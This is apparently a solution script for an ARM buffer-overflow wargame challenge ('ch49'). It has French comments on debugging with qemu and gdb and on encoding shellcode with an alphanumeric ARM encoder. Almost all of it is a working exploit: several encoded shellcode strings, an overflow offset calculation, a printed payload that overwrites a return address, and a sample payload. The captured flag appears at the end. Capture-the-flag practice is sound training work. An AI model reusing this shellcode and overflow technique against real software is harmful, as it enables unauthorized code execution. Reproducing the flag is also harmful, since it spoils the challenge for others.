#!/usr/bin/python
# coding: utf-8

# file ch49
# set architecture arm
# target remote 127.0.0.1:1234
# b *0x10c78
# c
# b *0x70776164
# x/32xw 0x7077645C-0x20

# qemu-arm -L /usr/arm-linux-gnueabi/ -g 1234 ./ch49 -c $(python -c 'print ""')

# aller voir le dépôt https://github.com/pratX/asga.git
# ./arm_alnum
# Input file type: C or binary? [C/b]b
# Input binary file name: shellcode
# Does the target system require instruction cache flush for self-modifying code?[y/n/c(can't say)]n
# Output file type: C or binary? [C/b] b
# Output binary file name: shellencode

# se placer en /tmp/koko et compiler priv_escalation.c en vuln


shellcode = "80AR80AR80AR80AR80AR80AR80AR80AR80AR80AR80AR80AR80AR80AR80AR80AR80AR80AR80AR80AR80AR80AR80AR80AR80AR80AR80AR00OB00OR00SU00SE9PSB9PSR0pMB80SBcACPdaDPqAGYyPDReaOPeaFPeaFPeaFPeaFPeaFPeaFPd0FU803R9pCRPP7R0P5BcPFE6PCBePFEBP3BlP5RYPFUVP3RAP5RWPFUXpFUx0GRcaFPaP7RAP5BIPFE8p4B0PMRGA5X9pWRAAAO8P4BgaOP000QxFd0i8QCa129ATQC61BTQC0119OBQCA169OCQCa02800271execme22727"
shellcode = "KPVRU0aRGPwBw01RGPFBAPFBJpwB3pcRNP1B9PVB3p8BsPSREPHRUPUR0PsBe0EREpCR6PWR2PDBRpSRs0vB0PiBapARC0RBpp9RY0iR00OR40OB00SU80SEGpSBGpSRGPCRzPERZPERSPERuGOPHPCRGPCR0p5RIpGR7EDPHPCRHp5R7p7BOpDEGpSBuGDPuGDPuGDPuGDP9p3ROpDUuGDPGPCREp5RTpGR7EDPHPCR7p5RHp7BOpDEGpSBuGDPuGDPuGDPFp5RMp7BOpDEGpSBuGDPwp5Rwp7BOpDEGpSBuGDPVp5RVp7BOpDEGpSBuGDPuGDPuGDPQp3RVp7ROpDUuGDPuGDPG0SR3CCP3cCPtVEPn0DR34OP3d4Pup4BBpSU54CPBPSUgr8PBpFU5dFP54CP2exReKOKC8FUdAVPLOZBdSKOFOZAPxrfflTpyPAVfaLPPIeJNrEJdKDggqiOFOCRpipnfOPsrHFjN1"
shellcode = "3PHRA0dRhPdRh09B3PWBmPaBh03RY0BR308BwPtBgpqR3PIRzPRRv03RCPuRipvB7pxBEPrBIP9ByPHR3P8B404BT08RJ0RRfpvBEpvR0POR4POB8PUU4PUEhpUBhpURh0ERz0CRz0CRz0CRn0CRsGOPi0ERfpERhpDUsGDPhpERhpDUsGDPQp3R1p7BhpDEhpUBsGDPh0ERNp3RlpGR7CDPi0ERop3RhpDEhpUBsGDPsGDPsGDPsGDPVp5RhpDUsGDPh0ERIp3RXpGR7CDPi0ERop3RhpDEhpUBsGDPsGDPsGDPlp3Rgp7BhpDEhpUBsGDPnp3Rnp7BhpDEhpUBsGDPQp3RQp7BhpDEhpUBsGDPsGDPsGDPxp5RPp7RhpDUsGDPsGDPsGDPfpERhpDUsGDPhpERhpDUsGDPUp3R5p7BhpDEhpUBsGDP7p5RhpDUhPUR5EEP5eEPtVCPI0MReCCVeBCVeICVehCVeQCVeTCVeVCVeWCVeBCVefCVeFCVecCV10MRGD3Yt3UPK9zOj04BbpDR7tOP7d4PE04B20WU5tGP2VWUcE9P20FU5dFP5tGP9uyRadRK3JFUEoSbvaDplOkRUCyoDoIqrXpFDLdpiPpFUQnpPIFzLRTZVkFGuQKoVOSRsYpntocCbHs2"
shellcode = "pPcRNpEBBPTRMp1RIpqRNP6BNPtBQ0XRePDBqP2BdpwRm06Bb0tR3pRBT0UByPDB50GRv0DREP9B304BYP7Rgp6B80vBrp7RUp1Rtp2R4POR8POB0PUU0PUEM0UBM0URMpERzpGRVpGRgpGRwcOPNpERMpERN07Rg0CR3gFPNpERo07Rg0FEM0UBwcFPwcFPwcFPwcFP305Rg0FUwcFPMpERT07Rc0CR3gFPNpERo07Rg0FEM0UBwcFPwcFPwcFPj07Ra03Bg0FEM0UBwcFPt07Rt03Bg0FEM0UBwcFPE07RE03Bg0FEM0UBwcFPwcFPwcFPC05RN03Rg0FUwcFPwcFPMPUR5EEP5eEPtVGPp0DR34OP3d4Pup4BDpSU54CPDkSUgT9PDpFU5dFP54CP1dyRGqmKEBFUgqtplOyrECkOvOharXcvvlDpyPrffanpPIEJnruJFkuwWqYOVOqrRIBNfOatBApsBHZ0"
shellcode = "k0xBXp9RV01RVp7RB0GBtp3RF0cB7pqBI01RH0IBEPCRx07BlPIB405BDpCR3P8BqpyBRP5Bd0eBypRRbpsBZpRBppXRkpSRz0SRtp4R4pOR8pOB4pWU0pWEVPWBVPWRV0GRz0CRV0CRV0CRsEOPW0GRV0GRIP3RbPER5CDPW0GRoP3RVPDEVPWBsEDPsEDPsEDPsEDPhP7RVPDUsEDPV0GRHP3RWPER5CDPW0GRoP3RVPDEVPWBsEDPsEDPsEDPiP3RbP5BVPDEVPWBsEDPVP3RVP5BVPDEVPWBsEDPoP3RoP5BVPDEVPWBsEDPsEDPsEDPGP7RQP5RVPDUsEDPsEDPVpWR7GGP7gGPtVCPwpDR7tOP7d4Pq04BK0WU5tGPKMWUcj9PK0FU5dFP5tGP2byRIBLKLHFUfaFPlOKRfskOToxaRXpFTLTpIPcvUQLPSyuJobTZvkEwTAYODosDrMbPDoRKpoPkROdoAfSEplrNw0"
shellcode = "7PuRV0FRLpcBp07RZPfRRP7Bg0wRuP7Ro0IRCPERbP1RXP2BJpURp0tRT09Rhp9BoPABk06RTp6BlPvBEpRBk0vB7p2BR09BX06RfpgR0POR4POB4PUU4PUEppUBppURp0ERz0CRz0CRz0CRP0CRsgOPq0ERnpERFpFUsgFPppERFpFUsgFPPp3R0p7BFpFEppUBsgFPp0EROp3RmpGR7cFPq0ERop3RFpFEppUBsgFPsgFPsgFPsgFPjp5Rdp7RFpFUsgFPp0ERWp3RfpGR7cFPq0ERop3RFpFEppUBsgFPsgFPsgFPfp3Rmp7BFpFEppUBsgFP3p3R3p7BFpFEppUBsgFPup3Rup7BFpFEppUBsgFPsgFPsgFP0pERFpFUsgFPsgFPsgFPnpERFpFUsgFPppERFpFUsgFP6p3RVp7BFpFEppUBsgFPZp5Rup7RFpFUpPUR5EEP5eEPtVCPY0MRecCVeHCVeICVehCVeUCVeQCVeSCVeRCVehCVeiCVeICVebCVA0MRGH3Yt3UPePqOxp4Bz0DR34OP3d4Pip4BJpSU54CPJVSUg89PJpFU5dFP54CP1ZyR3Q0KKjFUb1GwuQtplOirfskOVOZAcHaVDLvPyPAVTAnppIeJobTZvkVGDAIOvOAdbMbPToRKBObKpotoafCEPlpnb0"
len_shell = len(shellcode)
offset = 0x70776130-0x70776008+4

print("A"*offset+shellcode+"A"*(0x3e5-len_shell-offset)+"T"*28+"0awp")

#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAk0xBXp9RV01RVp7RB0GBtp3RF0cB7pqBI01RH0IBEPCRx07BlPIB405BDpCR3P8BqpyBRP5Bd0eBypRRbpsBZpRBppXRkpSRz0SRtp4R4pOR8pOB4pWU0pWEVPWBVPWRV0GRz0CRV0CRV0CRsEOPW0GRV0GRIP3RbPER5CDPW0GRoP3RVPDEVPWBsEDPsEDPsEDPsEDPhP7RVPDUsEDPV0GRHP3RWPER5CDPW0GRoP3RVPDEVPWBsEDPsEDPsEDPiP3RbP5BVPDEVPWBsEDPVP3RVP5BVPDEVPWBsEDPoP3RoP5BVPDEVPWBsEDPsEDPsEDPGP7RQP5RVPDUsEDPsEDPVpWR7GGP7gGPtVCPwpDR7tOP7d4Pq04BK0WU5tGPKMWUcj9PK0FU5dFP5tGP2byRIBLKLHFUfaFPlOKRfskOToxaRXpFTLTpIPcvUQLPSyuJobTZvkEwTAYODosDrMbPDoRKpoPkROdoAfSEplrNw0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATTTTTTTTTTTTTTTTTTTTTTTTTTTT0awp

#7he_A_t0_Zs_0f_Sh3llcod1ng
